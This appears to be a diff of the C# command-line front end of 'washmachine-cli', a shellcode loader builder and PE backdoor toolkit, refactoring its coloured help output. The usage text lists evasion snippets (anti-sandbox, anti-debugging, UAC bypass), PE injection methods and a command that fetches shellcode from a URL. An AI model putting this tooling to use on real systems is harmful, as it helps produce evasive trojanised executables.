-                    encTable.AddRow($"[mediumpurple1]{e.Index}[/]", $"[white]{Markup.Escape(e.Name)}[/]", $"[grey]{Markup.Escape(e.Description)}[/]");
+                    encTable.AddRow($"[{UiColors.Hex}]{e.Index}[/]", $"[{UiColors.Value}]{Markup.Escape(e.Name)}[/]", $"[{UiColors.Muted}]{Markup.Escape(e.Description)}[/]");
 
                 AnsiConsole.Write(encTable);
                 AnsiConsole.WriteLine();
 
                 var envTable = new Table()
                     .Border(TableBorder.Rounded)
-                    .BorderColor(Color.Grey42)
-                    .Title($"[bold cyan1]Envelopes[/] [grey]({catalog.Envelopes.Count})[/]")
-                    .AddColumn("[cyan1]Index[/]")
-                    .AddColumn("[cyan1]Name[/]")
-                    .AddColumn("[cyan1]Description[/]");
+                    .BorderColor(UiColors.BoxBorderColor)
+                    .Title($"[bold {UiColors.Header}]Envelopes[/] [{UiColors.Muted}]({catalog.Envelopes.Count})[/]")
+                    .AddColumn($"[{UiColors.Accent}]Index[/]")
+                    .AddColumn($"[{UiColors.Accent}]Name[/]")
+                    .AddColumn($"[{UiColors.Accent}]Description[/]");
 
                 foreach (var e in catalog.Envelopes)
-                    envTable.AddRow($"[mediumpurple1]{e.Index}[/]", $"[white]{Markup.Escape(e.Name)}[/]", $"[grey]{Markup.Escape(e.Description)}[/]");
+                    envTable.AddRow($"[{UiColors.Hex}]{e.Index}[/]", $"[{UiColors.Value}]{Markup.Escape(e.Name)}[/]", $"[{UiColors.Muted}]{Markup.Escape(e.Description)}[/]");
 
                 AnsiConsole.Write(envTable);
                 break;
@@ -2478,19 +2532,19 @@ public static class Program
                 var catalog = new YamlCodeSnippetCatalogService(paths);
                 var sections = catalog.GetAllSections();
 
-                var tree = new Tree($"[bold cyan1]Snippet Catalog[/] [grey]({sections.Count} sections)[/]");
+                var tree = new Tree($"[bold {UiColors.Header}]Snippet Catalog[/] [{UiColors.Muted}]({sections.Count} sections)[/]");
 
                 foreach (var s in sections)
                 {
                     var sectionKey = !string.IsNullOrWhiteSpace(s.Template) ? s.Template : s.Header;
                     var node = tree.AddNode(
-                        $"[bold darkorange]{Markup.Escape(s.Header)}[/] [grey]({s.Items.Count} items)[/]  " +
-                        $"[dim]--snippet {Markup.Escape(sectionKey)}=<id>[/]");
+                        $"[bold {UiColors.Warning}]{Markup.Escape(s.Header)}[/] [{UiColors.Muted}]({s.Items.Count} items)[/]  " +
+                        $"[{UiColors.Muted}]--snippet {Markup.Escape(sectionKey)}=<id>[/]");
                     foreach (var item in s.Items)
                     {
                         var label = item.IsDefault
-                            ? $"[green3_1]{Markup.Escape(item.Id)}[/] \u2014 {Markup.Escape(item.Display)} [green3_1]\u2605 default[/]"
-                            : $"[white]{Markup.Escape(item.Id)}[/] \u2014 [grey]{Markup.Escape(item.Display)}[/]";
+                            ? $"[{UiColors.Success}]{Markup.Escape(item.Id)}[/] \u2014 {Markup.Escape(item.Display)} [{UiColors.Success}]\u2605 default[/]"
+                            : $"[{UiColors.Value}]{Markup.Escape(item.Id)}[/] \u2014 [{UiColors.Muted}]{Markup.Escape(item.Display)}[/]";
                         node.AddNode(label);
                     }
                 }
@@ -2505,7 +2559,7 @@ public static class Program
 
                 if (result.Best != null)
                 {
-                    AnsiConsole.Write(new Panel($"[green3_1]Best compiler:[/] [grey]{Markup.Escape(result.Best.Path)}[/] [dim]({Markup.Escape($"{result.Best.Kind}")})[/]")
+                    AnsiConsole.Write(new Panel($"[{UiColors.Success}]Best compiler:[/] [{UiColors.Muted}]{Markup.Escape(result.Best.Path)}[/] [{UiColors.Muted}]({Markup.Escape($"{result.Best.Kind}")})[/]")
                         .BorderColor(Color.Green)
                         .Border(BoxBorder.Rounded));
                     AnsiConsole.WriteLine();
@@ -2513,27 +2567,27 @@ public static class Program
 
                 var table = new Table()
                     .Border(TableBorder.Rounded)
-                    .BorderColor(Color.Grey42)
-                    .Title($"[bold cyan1]Candidates[/] [grey]({result.Candidates.Count})[/]")
-                    .AddColumn(new TableColumn("[cyan1]Kind[/]").LeftAligned())
-                    .AddColumn(new TableColumn("[cyan1]Path[/]").LeftAligned());
+                    .BorderColor(UiColors.BoxBorderColor)
+                    .Title($"[bold {UiColors.Header}]Candidates[/] [{UiColors.Muted}]({result.Candidates.Count})[/]")
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Kind[/]").LeftAligned())
+                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Path[/]").LeftAligned());
 
                 foreach (var c in result.Candidates)
-                    table.AddRow($"[cyan1]{Markup.Escape($"{c.Kind}")}[/]", $"[grey]{Markup.Escape(c.Path)}[/]");
+                    table.AddRow($"[{UiColors.Accent}]{Markup.Escape($"{c.Kind}")}[/]", $"[{UiColors.Muted}]{Markup.Escape(c.Path)}[/]");
 
                 AnsiConsole.Write(table);
 
                 if (result.Errors.Count > 0)
                 {
                     AnsiConsole.WriteLine();
-                    AnsiConsole.MarkupLine("[gold1]Errors:[/]");
+                    AnsiConsole.MarkupLine($"[{UiColors.Warning}]Errors:[/]");
                     foreach (var e in result.Errors)
-                        AnsiConsole.MarkupLine($"  [red]{Markup.Escape(e)}[/]");
+                        AnsiConsole.MarkupLine($"  [{UiColors.Error}]{Markup.Escape(e)}[/]");
                 }
                 break;
             }
             default:
-                AnsiConsole.MarkupLine($"[red]Error:[/] Unknown list target: {Markup.Escape(what)}. Use templates, encoders, snippets, or compilers.");
+                AnsiConsole.MarkupLine($"[{UiColors.Error}]Error:[/] Unknown list target: {Markup.Escape(what)}. Use templates, encoders, snippets, or compilers.");
                 return 1;
         }
 
@@ -2579,171 +2633,138 @@ public static class Program
         }
     }
 
-    private static int PrintCompileUsage()
+    private static int PrintEncodeUsage()
     {
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli compile [darkorange]--shellcode <file>[/] [grey][[options]][/]");
-        AnsiConsole.WriteLine();
-
-        AnsiConsole.Write(new Rule("[cyan1]Required (one of)[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-        AnsiConsole.WriteLine();
-
-        var reqTable = new Table()
-            .Border(TableBorder.None)
-            .HideHeaders()
-            .AddColumn("Option")
-            .AddColumn("Description");
-
-        reqTable.AddRow("[darkorange]--shellcode, -s <file>[/]", "Path to shellcode .bin file");
-        reqTable.AddRow("[darkorange]--shellcode-hex <hex>[/]", "Hex-encoded shellcode string");
-        reqTable.AddRow("[darkorange]--shellcode-url, -u <url>[/]", "URL to fetch shellcode from");
-
-        AnsiConsole.Write(reqTable);
-        AnsiConsole.WriteLine();
-
-        AnsiConsole.Write(new Rule("[cyan1]Options[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-        AnsiConsole.WriteLine();
-
-        var optTable = new Table()
-            .Border(TableBorder.None)
-            .HideHeaders()
-            .AddColumn("Option")
-            .AddColumn("Description");
-
-        optTable.AddRow("[darkorange]--template, -t <id>[/]", "Template ID (default: shellcode-minimal)");
-        optTable.AddRow("[darkorange]--encoder, -e <index>[/]", "Bin2Shell encoder index (default: 0 = none)");
-        optTable.AddRow("[darkorange]--envelope, -v <index>[/]", "Bin2Shell envelope index (default: 0 = none)");
-        optTable.AddRow("[darkorange]--snippet <section=id>[/]", "Snippet selection per section (repeatable). Use 'list --snippets' to see available sections and IDs.");
-        optTable.AddRow("[darkorange]--verbose[/]", "Enable verbose logging");
-        optTable.AddRow("[darkorange]--json[/]", "Output results as JSON");
-
-        AnsiConsole.Write(optTable);
-        AnsiConsole.WriteLine();
-
-        AnsiConsole.Write(new Rule("[cyan1]Snippet Selection[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("  Each template has placeholders for snippet sections (anti-debugging, evasion, injection, etc.).");
-        AnsiConsole.MarkupLine("  Use [darkorange]--snippet <section>=<id>[/] to override the default selection for a section.");
-        AnsiConsole.MarkupLine("  Run [darkorange]list --snippets[/] to see all available sections and their item IDs.");
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("  [grey]--snippet antiemulation=SirAllocALot[/]");
-        AnsiConsole.MarkupLine("  [grey]--snippet antisandbox=Default --snippet antidebugging=IsDebuggerPresent[/]");
-        AnsiConsole.WriteLine();
-
-        AnsiConsole.Write(new Rule("[cyan1]Examples[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli compile -s payload.bin[/]");
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli compile -s payload.bin -t shellcode-minimal[/]");
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli compile --shellcode-hex FC4883E4F0... -e 1[/]");
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli compile -u http://host/shell.bin --verbose[/]");
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli compile -s payload.bin --snippet antiemulation=SirAllocALot --snippet antisandbox=Default[/]");
-
+        UsageFormatter.Print(new CommandUsage(
+            Name: "encode",
+            Syntax: $"encode [{UiColors.Warning}]--shellcode <file>[/] [{UiColors.Muted}][[options]][/]",
+            Description: "Encode shellcode via Bin2Shell and build a loader executable from a template",
+            Required: new[]
+            {
+                new UsageOption("--shellcode, -s <file>", "Path to shellcode .bin file"),
+                new UsageOption("--shellcode-hex <hex>", "Hex-encoded shellcode string"),
+                new UsageOption("--shellcode-url, -u <url>", "URL to fetch shellcode from"),
+            },
+            Options: new[]
+            {
+                new UsageOption("--template, -t <id>", "Template ID (use 'list --templates' to see options)", "shellcode-minimal"),
+                new UsageOption("--encoder, -e <index>", "Bin2Shell encoder index", "0 (none)"),
+                new UsageOption("--envelope, -v <index>", "Bin2Shell envelope index", "0 (none)"),
+                new UsageOption("--snippet <section=id>", "Override a snippet section (repeatable, see below)"),
+                new UsageOption("--verbose", "Enable verbose logging"),
+                new UsageOption("--json", "Output results as JSON"),
+            },
+            Examples: new[]
+            {
+                new UsageExample("encode -s payload.bin", "Encode with the default template"),
+                new UsageExample("encode -s payload.bin -t shellcode-minimal", "Specify a template explicitly"),
+                new UsageExample("encode --shellcode-hex FC4883E4F0... -e 1", "Encode from hex with XOR encoder"),
+                new UsageExample("encode -u http://host/shell.bin --verbose", "Fetch shellcode from URL"),
+                new UsageExample("encode -s payload.bin --snippet antiemulation=SirAllocALot", "Override the anti-emulation snippet"),
+                new UsageExample("encode -s p.bin --snippet antiemulation=SirAllocALot --snippet guardrails=domain_check", "Stack multiple snippets"),
+            },
+            Notes: new[]
+            {
+                "Provide exactly one shellcode source: --shellcode, --shellcode-hex, or --shellcode-url.",
+                "",
+                "The encode command processes shellcode through Bin2Shell encoding, merges it into",
+                "a C++ template with optional evasion snippets, and compiles the final loader.",
+                "",
+                $"[bold {UiColors.Accent}]Snippet Selection (--snippet):[/]",
+                "  Snippets are organized into sections (playbook categories). Each section",
+                "  offers multiple technique choices. Use --snippet to override the default:",
+                "",
+                $"  [{UiColors.Accent}]--snippet <section>=<snippet_id>[/]",
+                "",
+                $"  [{UiColors.Label}]Example sections:[/] antiemulation, antianalysis, antidebugging, antisandbox,",
+                "  guardrails, decoy, processinjection, shellcodeexecution, uacbypass, genericpayload",
+                "",
+                $"  Run [{UiColors.Accent}]list --snippets[/] to see all available sections and snippet IDs.",
+                $"  Run [{UiColors.Accent}]list --templates[/] to see available code templates.",
+                $"  Run [{UiColors.Accent}]list --encoders[/] to see available Bin2Shell encoders and envelopes.",
+            }));
         return 0;
     }
 
     private static int PrintAnalyzeUsage()
     {
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli analyze [darkorange]<pe-file>[/] [grey][[options]][/]");
-        AnsiConsole.WriteLine();
-
-        AnsiConsole.Write(new Rule("[cyan1]Required[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-        AnsiConsole.WriteLine();
-
-        var reqTable = new Table()
-            .Border(TableBorder.None)
-            .HideHeaders()
-            .AddColumn("Option")
-            .AddColumn("Description");
-
-        reqTable.AddRow("[darkorange]<pe-file>[/]", "Path to the PE file to analyze");
-
-        AnsiConsole.Write(reqTable);
-        AnsiConsole.WriteLine();
-
-        AnsiConsole.Write(new Rule("[cyan1]Options[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-        AnsiConsole.WriteLine();
-
-        var optTable = new Table()
-            .Border(TableBorder.None)
-            .HideHeaders()
-            .AddColumn("Option")
-            .AddColumn("Description");
-
-        optTable.AddRow("[darkorange]--json[/]", "Output results as JSON");
-
-        AnsiConsole.Write(optTable);
-        AnsiConsole.WriteLine();
-
-        AnsiConsole.Write(new Rule("[cyan1]Examples[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli analyze target.exe[/]");
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli analyze malware.dll --json[/]");
-
+        UsageFormatter.Print(new CommandUsage(
+            Name: "analyze",
+            Syntax: $"analyze [{UiColors.Warning}]<pe-file>[/] [{UiColors.Muted}][[options]][/]",
+            Description: "Analyze a PE file — headers, sections, imports, code caves",
+            Required: new[]
+            {
+                new UsageOption("<pe-file>", "Path to the PE file to analyze"),
+            },
+            Options: new[]
+            {
+                new UsageOption("--json", "Output results as JSON"),
+            },
+            Examples: new[]
+            {
+                new UsageExample("analyze target.exe", "Analyze a PE executable"),
+                new UsageExample("analyze malware.dll --json", "Analyze a DLL with JSON output"),
+            },
+            Notes: new[]
+            {
+                "Displays architecture, sections, imports, exports, entry point, and code caves.",
+                "Useful for recon before backdooring or debugging injection issues.",
+            }));
         return 0;
     }
 
     private static int PrintListUsage()
     {
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli list [darkorange]<target>[/]");
-        AnsiConsole.WriteLine();
-
-        AnsiConsole.Write(new Rule("[cyan1]Targets[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-        AnsiConsole.WriteLine();
-
-        var optTable = new Table()
-            .Border(TableBorder.None)
-            .HideHeaders()
-            .AddColumn("Option")
-            .AddColumn("Description");
-
-        optTable.AddRow("[darkorange]--templates[/]", "List available code templates");
-        optTable.AddRow("[darkorange]--encoders[/]", "List available encoders and envelopes");
-        optTable.AddRow("[darkorange]--snippets[/]", "List available snippet sections and items");
-        optTable.AddRow("[darkorange]--compilers[/]", "List discovered compiler toolchains");
-
-        AnsiConsole.Write(optTable);
-        AnsiConsole.WriteLine();
-
-        AnsiConsole.Write(new Rule("[cyan1]Examples[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli list --templates[/]");
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli list --encoders[/]");
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli list --snippets[/]");
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli list --compilers[/]");
-
+        UsageFormatter.Print(new CommandUsage(
+            Name: "list",
+            Syntax: $"list [{UiColors.Warning}]<target>[/]",
+            Description: "List available templates, encoders, snippets, or compilers",
+            Required: new[]
+            {
+                new UsageOption("--templates", "List available code templates"),
+                new UsageOption("--encoders", "List available encoders and envelopes"),
+                new UsageOption("--snippets", "List available snippet sections and items"),
+                new UsageOption("--compilers", "List discovered compiler toolchains"),
+            },
+            Examples: new[]
+            {
+                new UsageExample("list --templates", "Show code templates"),
+                new UsageExample("list --encoders", "Show Bin2Shell encoders and envelopes"),
+                new UsageExample("list --snippets", "Show snippet sections and their IDs"),
+                new UsageExample("list --compilers", "Show discovered C/C++ compilers"),
+            }));
         return 0;
     }
 
     private static int PrintProvisionUsage()
     {
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli provision");
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("[dim]Downloads and installs required external tools (Bin2Shell).[/]");
-        AnsiConsole.MarkupLine("[dim]This command takes no additional options.[/]");
-        AnsiConsole.WriteLine();
-
-        AnsiConsole.Write(new Rule("[cyan1]Example[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli provision[/]");
-
+        UsageFormatter.Print(new CommandUsage(
+            Name: "provision",
+            Syntax: "provision",
+            Description: "Download and install required external tools (Bin2Shell)",
+            Examples: new[]
+            {
+                new UsageExample("provision", "Download and install Bin2Shell"),
+            },
+            Notes: new[]
+            {
+                "Run this once after installation to set up Bin2Shell for encoding support.",
+                "Requires an active internet connection.",
+            }));
         return 0;
     }
 
     private static int PrintTestUsage()
     {
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli test [grey][[options]][/]");
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("[dim]Runs the automated test harness against the toolkit.[/]");
-        AnsiConsole.WriteLine();
-
-        AnsiConsole.Write(new Rule("[cyan1]Example[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli test[/]");
-
+        UsageFormatter.Print(new CommandUsage(
+            Name: "test",
+            Syntax: $"test [{UiColors.Muted}][[options]][/]",
+            Description: "Run the automated test harness against the toolkit",
+            Examples: new[]
+            {
+                new UsageExample("test", "Run all automated tests"),
+                new UsageExample("test --help", "Show test options"),
+            }));
         return 0;
     }
 
@@ -2754,63 +2775,127 @@ public static class Program
     private static int PrintUsage()
     {
         AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("[white]Shellcode loader builder & PE backdoor toolkit[/]");
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("[dim]Usage:[/] washmachine-cli [cyan1]<command>[/] [grey][[options]][/]");
-        AnsiConsole.WriteLine();
 
         var commandTable = new Table()
-            .Border(TableBorder.Rounded)
-            .BorderColor(Color.Grey42)
-            .AddColumn(new TableColumn("[cyan1]Command[/]"))
-            .AddColumn(new TableColumn("[white]Description[/]"));
+            .Border(TableBorder.Simple)
+            .BorderColor(UiColors.BoxBorderColor)
+            .AddColumn(new TableColumn($"[{UiColors.Accent}]Command[/]"))
+            .AddColumn(new TableColumn($"[{UiColors.Accent}]Description[/]"));
 
-        commandTable.AddRow("[cyan1]compile[/]", "Build a shellcode loader executable");
-        commandTable.AddRow("[cyan1]analyze[/]", "Analyze a PE file (headers, sections, imports, code caves)");
-        commandTable.AddRow("[cyan1]backdoor[/]", "Inject shellcode into an existing PE file");
-        commandTable.AddRow("[cyan1]strip[/]", "Extract flat binary (.bin) from a PE file");
-        commandTable.AddRow("[cyan1]list[/]", "List available templates, encoders, snippets, or compilers");
-        commandTable.AddRow("[cyan1]provision[/]", "Download and install required external tools (Bin2Shell)");
-        commandTable.AddRow("[cyan1]test[/]", "Run the automated test harness");
+        commandTable.AddRow($"[{UiColors.Accent}]encode[/]",    $"[{UiColors.Value}]Encode shellcode via Bin2Shell and build a loader executable[/]");
+        commandTable.AddRow($"[{UiColors.Accent}]analyze[/]",   $"[{UiColors.Value}]Analyze a PE file (headers, sections, imports, code caves)[/]");
+        commandTable.AddRow($"[{UiColors.Accent}]backdoor[/]",  $"[{UiColors.Value}]Inject shellcode into an existing PE file[/]");
+        commandTable.AddRow($"[{UiColors.Accent}]strip[/]",     $"[{UiColors.Value}]Extract flat binary (.bin) from a PE file[/]");
+        commandTable.AddRow($"[{UiColors.Accent}]list[/]",      $"[{UiColors.Value}]List available templates, encoders, snippets, or compilers[/]");
+        commandTable.AddRow($"[{UiColors.Accent}]provision[/]", $"[{UiColors.Value}]Download and install required external tools (Bin2Shell)[/]");
+        commandTable.AddRow($"[{UiColors.Accent}]test[/]",      $"[{UiColors.Value}]Run the automated test harness[/]");
 
-        AnsiConsole.Write(new Panel(commandTable)
-            .Header("[bold cyan1]washmachine-cli[/]")
-            .Border(BoxBorder.Rounded)
-            .BorderColor(Color.Cyan1));
+        AnsiConsole.Write(UsageFormatter.MakePanel("Core Commands", commandTable));
 
+        var usageRows = new Rows(
+            new Markup($"[{UiColors.Muted}]washmachine-cli[/] [{UiColors.Accent}]<command>[/] [{UiColors.Muted}][[options]][/]"));
+        AnsiConsole.Write(UsageFormatter.MakePanel("Usage", usageRows));
+
+        var exampleRows = new Rows(
+            new Markup($"[{UiColors.Accent}]$[/] [{UiColors.Value}]washmachine-cli encode -s payload.bin -t shellcode-minimal[/]"),
+            new Markup($"[{UiColors.Accent}]$[/] [{UiColors.Value}]washmachine-cli backdoor --pe app.exe -s payload.bin -m new-section[/]"),
+            new Markup($"[{UiColors.Accent}]$[/] [{UiColors.Value}]washmachine-cli analyze target.exe[/]"),
+            new Markup($"[{UiColors.Accent}]$[/] [{UiColors.Value}]washmachine-cli strip loader.exe -o loader.bin[/]"),
+            new Markup($"[{UiColors.Accent}]$[/] [{UiColors.Value}]washmachine-cli list --templates[/]"),
+            new Text(""),
+            new Markup($"[{UiColors.Muted}]Run[/] [{UiColors.Accent}]help <command>[/] [{UiColors.Muted}]for detailed options, or[/] [{UiColors.Accent}]help --all[/] [{UiColors.Muted}]for extended reference.[/]"));
+        AnsiConsole.Write(UsageFormatter.MakePanel("Quick Examples", exampleRows));
+
+        return 0;
+    }
+
+    /// <summary>Extended scrollable help — prints every command's full usage in one view.</summary>
+    private static int PrintExtendedHelp()
+    {
         AnsiConsole.WriteLine();
+        AnsiConsole.Write(new FigletText("WASHMACHINE").Color(UiColors.BannerColor));
 
-        // Pipeline
-        AnsiConsole.Write(new Rule("[cyan1]Pipeline[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("  [dim]1.[/] [cyan1]compile[/]   shellcode.bin  [dim]-->[/]  loader.exe");
-        AnsiConsole.MarkupLine("  [dim]2.[/] [cyan1]strip[/]     loader.exe     [dim]-->[/]  loader.bin");
-        AnsiConsole.MarkupLine("  [dim]3.[/] [cyan1]backdoor[/]  loader.bin + target.exe  [dim]-->[/]  backdoored.exe");
+        var headerRows = new Rows(
+            new Markup($"[{UiColors.Muted}]Scrollable reference for all commands and options.[/]"),
+            new Markup($"[{UiColors.Muted}]Tip: Pipe to[/] [{UiColors.Accent}]less[/] [{UiColors.Muted}]or scroll your terminal buffer.[/]"));
+        AnsiConsole.Write(UsageFormatter.MakePanel("Extended Command Reference", headerRows));
 
-        AnsiConsole.WriteLine();
+        // 1. Table of Contents
+        var tocTable = new Table()
+            .Border(TableBorder.Simple)
+            .BorderColor(UiColors.BoxBorderColor)
+            .AddColumn(new TableColumn($"[{UiColors.Accent}]#[/]").Centered())
+            .AddColumn(new TableColumn($"[{UiColors.Accent}]Command[/]"))
+            .AddColumn(new TableColumn($"[{UiColors.Accent}]Purpose[/]"));
 
-        // Examples
-        AnsiConsole.Write(new Rule("[cyan1]Quick Examples[/]").RuleStyle(Style.Parse("grey42")).LeftJustified());
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli compile -s payload.bin -t shellcode-minimal[/]");
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli backdoor --pe app.exe -s loader.bin[/]");
-        AnsiConsole.MarkupLine("  [grey]washmachine-cli analyze target.exe[/]");
+        tocTable.AddRow($"[{UiColors.Muted}]1[/]", $"[{UiColors.Accent}]encode[/]",    $"[{UiColors.Value}]Encode shellcode via Bin2Shell and build a loader[/]");
+        tocTable.AddRow($"[{UiColors.Muted}]2[/]", $"[{UiColors.Accent}]analyze[/]",   $"[{UiColors.Value}]Inspect PE headers, sections, imports, code caves[/]");
+        tocTable.AddRow($"[{UiColors.Muted}]3[/]", $"[{UiColors.Accent}]backdoor[/]",  $"[{UiColors.Value}]Inject shellcode into an existing PE binary[/]");
+        tocTable.AddRow($"[{UiColors.Muted}]4[/]", $"[{UiColors.Accent}]strip[/]",     $"[{UiColors.Value}]Extract flat binary from PE sections[/]");
+        tocTable.AddRow($"[{UiColors.Muted}]5[/]", $"[{UiColors.Accent}]list[/]",      $"[{UiColors.Value}]List templates, encoders, snippets, compilers[/]");
+        tocTable.AddRow($"[{UiColors.Muted}]6[/]", $"[{UiColors.Accent}]provision[/]", $"[{UiColors.Value}]Download external tools (Bin2Shell)[/]");
+        tocTable.AddRow($"[{UiColors.Muted}]7[/]", $"[{UiColors.Accent}]test[/]",      $"[{UiColors.Value}]Run the automated test harness[/]");
+        AnsiConsole.Write(UsageFormatter.MakePanel("Table of Contents", tocTable));
 
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine("[dim]Run[/] [cyan1]help <command>[/] [dim]for detailed options and examples.[/]");
+        // 2. Each command's full help
+        PrintEncodeUsage();    AnsiConsole.WriteLine();
+        PrintAnalyzeUsage();   AnsiConsole.WriteLine();
+        PrintBackdoorUsage();  AnsiConsole.WriteLine();
+        PrintStripUsage();     AnsiConsole.WriteLine();
+        PrintListUsage();      AnsiConsole.WriteLine();
+        PrintProvisionUsage(); AnsiConsole.WriteLine();
+        PrintTestUsage();      AnsiConsole.WriteLine();
+
+        // 3. Workflow examples
+        var workflowRows = new Rows(
+            new Markup($"[{UiColors.Accent}]Workflow 1:[/] [{UiColors.Value}]Encode shellcode into a standalone loader[/]"),
+            new Markup($"  [{UiColors.Accent}]$[/] [{UiColors.Muted}]washmachine-cli encode -s payload.bin -t shellcode-minimal -e 1[/]"),
+            new Text(""),
+            new Markup($"[{UiColors.Accent}]Workflow 2:[/] [{UiColors.Value}]Backdoor a legitimate PE with shellcode[/]"),
+            new Markup($"  [{UiColors.Accent}]$[/] [{UiColors.Muted}]washmachine-cli analyze target.exe[/]"),
+            new Markup($"  [{UiColors.Accent}]$[/] [{UiColors.Muted}]washmachine-cli backdoor --pe target.exe -s payload.bin -m new-section -o patched.exe[/]"),
+            new Text(""),
+            new Markup($"[{UiColors.Accent}]Workflow 3:[/] [{UiColors.Value}]Strip a loader to flat binary, then inject into PE[/]"),
+            new Markup($"  [{UiColors.Accent}]$[/] [{UiColors.Muted}]washmachine-cli encode -s payload.bin[/]"),
+            new Markup($"  [{UiColors.Accent}]$[/] [{UiColors.Muted}]washmachine-cli strip loader.exe -o loader.bin[/]"),
+            new Markup($"  [{UiColors.Accent}]$[/] [{UiColors.Muted}]washmachine-cli backdoor --pe target.exe -s loader.bin -m code-cave[/]"));
+        AnsiConsole.Write(UsageFormatter.MakePanel("Typical Workflows", workflowRows));
+
+        // 4. Injection Methods Quick Reference
+        var injTable = new Table()
+            .Border(TableBorder.Simple)
+            .BorderColor(UiColors.BoxBorderColor)
+            .AddColumn(new TableColumn($"[{UiColors.Accent}]Method[/]"))
+            .AddColumn(new TableColumn($"[{UiColors.Accent}]Flag[/]"))
+            .AddColumn(new TableColumn($"[{UiColors.Accent}]Arch[/]"))
+            .AddColumn(new TableColumn($"[{UiColors.Accent}]Description[/]"));
+
+        injTable.AddRow($"[{UiColors.Value}]Code Cave[/]",           $"[{UiColors.Accent}]-m code-cave[/]",    $"[{UiColors.Muted}]x86/x64[/]", $"[{UiColors.Muted}]Reuse slack space in existing sections[/]");
+        injTable.AddRow($"[{UiColors.Value}]New Section[/]",         $"[{UiColors.Accent}]-m new-section[/]",  $"[{UiColors.Muted}]x86/x64[/]", $"[{UiColors.Muted}]Append a new PE section with payload[/]");
+        injTable.AddRow($"[{UiColors.Value}]Section Extension[/]",   $"[{UiColors.Accent}]-m section-ext[/]",  $"[{UiColors.Muted}]x86/x64[/]", $"[{UiColors.Muted}]Extend last section to embed payload[/]");
+        injTable.AddRow($"[{UiColors.Value}]Text Padding[/]",        $"[{UiColors.Accent}]-m text-pad[/]",     $"[{UiColors.Muted}]x86/x64[/]", $"[{UiColors.Muted}]Write into .text VirtualSize↔RawSize gap[/]");
+        injTable.AddRow($"[{UiColors.Value}]TLS Callback[/]",        $"[{UiColors.Accent}]-m tls-callback[/]", $"[{UiColors.Muted}]x64[/]",     $"[{UiColors.Muted}]TLS callback runs payload before main[/]");
+        AnsiConsole.Write(UsageFormatter.MakePanel("Injection Methods Quick Reference", injTable));
+
+        // 5. Global notes
+        var noteRows = new Rows(
+            new Markup($"[{UiColors.Muted}]• All commands support[/] [{UiColors.Accent}]--help[/] [{UiColors.Muted}]or[/] [{UiColors.Accent}]-h[/] [{UiColors.Muted}]for individual help[/]"),
+            new Markup($"[{UiColors.Muted}]• Use[/] [{UiColors.Accent}]--json[/] [{UiColors.Muted}]where available for machine-readable output[/]"),
+            new Markup($"[{UiColors.Muted}]• Run[/] [{UiColors.Accent}]provision[/] [{UiColors.Muted}]once before using encoding features[/]"),
+            new Markup($"[{UiColors.Muted}]• Interactive REPL mode: launch without arguments for an interactive session[/]"));
+        AnsiConsole.Write(UsageFormatter.MakePanel("Global Notes", noteRows));
 
         return 0;
     }
 
     private static int PrintUnknownCommand(string command)
     {
-        var validCommands = new[] { "compile", "analyze", "backdoor", "strip", "list", "provision", "test", "help" };
+        var validCommands = new[] { "encode", "analyze", "backdoor", "strip", "list", "provision", "test", "help" };
 
         AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine($"[red1]Unknown command:[/] [white]{Markup.Escape(command)}[/]");
+        AnsiConsole.MarkupLine($"[{UiColors.Error}]Error:[/] [{UiColors.Value}]Unknown command '{Markup.Escape(command)}'[/]");
         AnsiConsole.WriteLine();
 
-        // Suggest similar commands using simple substring/distance matching
         var suggestions = validCommands
             .Where(c => c.Contains(command, StringComparison.OrdinalIgnoreCase)
                      || command.Contains(c, StringComparison.OrdinalIgnoreCase)
@@ -2819,18 +2904,18 @@ public static class Program
 
         if (suggestions.Length > 0)
         {
